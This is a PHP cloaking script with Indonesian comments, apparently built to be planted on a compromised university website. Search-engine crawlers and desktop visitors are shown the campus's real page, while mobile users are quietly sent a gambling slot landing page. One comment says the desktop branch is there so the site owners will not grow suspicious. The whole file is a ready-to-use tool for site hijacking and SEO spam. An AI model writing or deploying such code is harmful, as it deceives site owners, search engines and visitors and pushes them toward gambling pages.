<?php
// ==========================================
// 1. DEFINISIKAN VARIABEL YANG COBA DIBACA
// ==========================================

// Mengambil data user agent dari browser pengunjung secara otomatis
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

// Proses deteksi perangkat mobile/HP secara otomatis
$is_mobile = false;
$mobile_agents = array('mobile', 'android', 'iphone', 'ipod', 'blackberry', 'opera mini', 'windows phone');
foreach ($mobile_agents as $device) {
    if (stripos($user_agent, $device) !== false) {
        $is_mobile = true;
        break;
    }
}

// ==========================================
// 2. JALANKAN LOGIKA CLOAKING / PENYARINGAN
// ==========================================

// Jika robot Google atau crawler lain yang datang
if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false || stripos($user_agent, 'crawl') !== false) {
    include('home.php');  // Memuat konten asli kampus
    exit();
} 
// Jika user asli mengakses menggunakan HP/Mobile
elseif ($is_mobile) {
    include('size.php');  // Memuat Landing Page Slot Anda
    exit();
} 
// Jika user mengakses dari desktop/komputer
else {
    include('home.php');  // Memuat konten asli kampus agar tidak curiga
    exit();
}
?>
